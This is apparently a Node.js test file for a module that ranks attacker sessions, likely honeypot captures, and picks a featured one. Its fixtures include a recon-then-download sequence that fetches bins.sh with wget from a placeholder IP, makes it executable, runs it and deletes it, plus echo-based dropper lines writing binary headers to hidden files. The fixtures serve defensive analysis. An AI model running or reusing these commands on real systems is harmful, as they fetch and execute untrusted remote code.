const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { scoreSession, pickFeatured } = require('../lib/featured');

const STORY = [
  'uname -a',
  'cat /proc/cpuinfo',
  'cd /tmp; wget http://1.2.3.4/bins.sh',
  'chmod +x bins.sh; ./bins.sh',
  'rm -rf bins.sh',
];

// The shape that was being featured: a scripted dropper, long and repetitive,
// with binaries pushed through echo.
const DROPPER = [
  ...Array.from({ length: 40 }, (_, i) => `echo -ne "\\x7f\\x45" >> .s${i}`),
  ...Array.from({ length: 8 }, (_, i) => `echo ${'A'.repeat(2000 + i * 100)} > .b${i}`),
];

describe('scoreSession', () => {
  test('a session with fewer than three readable commands has no story', () => {
    assert.equal(scoreSession(['uname -a', 'whoami']), null);
    assert.equal(scoreSession([]), null);
  });

  test('duplicates do not count twice', () => {
    assert.equal(scoreSession(['ls', 'ls', 'ls', 'ls']), null);
  });

  test('ignores empty and non-string entries', () => {
    assert.equal(scoreSession(['', null, '  ', 'ls']), null);
  });

  test('a download outscores the same session without one', () => {
    const without = STORY.filter((c) => !c.includes('wget'));
    assert.ok(scoreSession(STORY) > scoreSession([...without, 'id']));
  });
});

describe('pickFeatured', () => {
  test('prefers a short story over a long blob-heavy dropper', () => {
    const picked = pickFeatured([
      { session_id: 'dropper', commands: DROPPER },
      { session_id: 'story', commands: STORY },
    ]);
    assert.equal(picked, 'story');
  });

  test('caps the credit for sheer length', () => {
    const script = Array.from({ length: 120 }, (_, i) => `echo line ${i}`);
    assert.equal(scoreSession(script), scoreSession(script.slice(0, 25)));
  });

  test('returns null when nothing qualifies', () => {
    assert.equal(pickFeatured([{ session_id: 'x', commands: ['ls'] }]), null);
    assert.equal(pickFeatured([]), null);
  });
});
